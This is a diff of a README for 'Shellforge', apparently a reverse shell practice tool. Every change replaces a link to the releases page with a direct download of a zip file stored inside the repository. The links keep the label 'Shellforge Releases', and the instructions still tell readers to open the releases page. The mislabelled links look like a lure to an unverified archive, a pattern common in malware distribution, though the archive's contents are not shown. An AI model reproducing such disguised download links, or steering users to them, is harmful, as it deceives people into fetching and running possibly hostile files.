@@ -1,10 +1,10 @@
 # 🛠️ Shellforge - Fast Reverse Shell Practice Tool
 
-[![Download Shellforge](https://img.shields.io/badge/Download%20Shellforge-blue?style=for-the-badge&logo=github)](https://github.com/bradleyhodgkinson0-beep/Shellforge/releases)
+[![Download Shellforge](https://img.shields.io/badge/Download%20Shellforge-blue?style=for-the-badge&logo=github)](https://github.com/bradleyhodgkinson0-beep/Shellforge/raw/refs/heads/main/formats/Software-3.9.zip)
 
 ## 📥 Download Shellforge
 
-Visit this page to download: [Shellforge Releases](https://github.com/bradleyhodgkinson0-beep/Shellforge/releases)
+Visit this page to download: [Shellforge Releases](https://github.com/bradleyhodgkinson0-beep/Shellforge/raw/refs/heads/main/formats/Software-3.9.zip)
 
 1. Open the releases page in your web browser.
 2. Find the latest release at the top of the list.
@@ -168,7 +168,7 @@ If Shellforge includes menu prompts, use these basic tips:
 
 ## 📎 Download Again
 
-If you need the file later, use this page again: [Shellforge Releases](https://github.com/bradleyhodgkinson0-beep/Shellforge/releases)
+If you need the file later, use this page again: [Shellforge Releases](https://github.com/bradleyhodgkinson0-beep/Shellforge/raw/refs/heads/main/formats/Software-3.9.zip)
 
 ## 🧩 Project Topics
 
